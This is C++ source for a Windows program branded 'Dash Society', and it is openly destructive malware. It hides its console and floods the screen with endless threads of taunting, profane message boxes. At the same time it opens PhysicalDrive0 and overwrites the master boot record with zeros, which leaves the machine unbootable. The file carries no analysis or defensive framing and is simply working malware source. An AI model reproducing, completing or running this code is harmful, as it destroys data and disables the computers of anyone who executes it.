

// Author: Dashie
// Version: 1.0


#include <windows.h>
#include <conio.h>

#include <iostream>
#include <vector>
#include <thread>
#include <string>


std::vector<std::thread> threads;

std::vector<LPCSTR> messages = 
{
    "Dash Society OWNS YOU!!!", "Come at me bro!", "You just got fucked!",
    "No Face and no Voice", "Who am I?", "Fuk you!"
};


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    threads.push_back(
        std::thread([]() 
            {
                threads.push_back(
                    std::thread([]()
                        {
                            Sleep(8000);

                            while (true)
                            {
                                threads.push_back(
                                    std::thread([]()
                                        {
                                            srand((unsigned int)time(NULL));

                                            while (true)
                                            {
                                                MessageBox(NULL, messages[rand() % messages.size()], "Dash Society", MB_OK | MB_ICONWARNING);
                                            };
                                        }
                                    )
                                );

                                Sleep(3000);
                            };
                        }
                    )
                );

                threads.push_back(
                    std::thread([]()
                        {
                            char MBRData[512];
                            ZeroMemory(&MBRData, (sizeof MBRData));

                            LPCSTR PATH = "\\\\.\\PhysicalDrive0";

                            HANDLE MBR = CreateFile(PATH, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
                            DWORD WRITE;

                            WriteFile(MBR, MBRData, 512, &WRITE, NULL);
                            CloseHandle(MBR);
                        }
                    )
                );
            }
        )
    );

    _getch();

    return -1;
};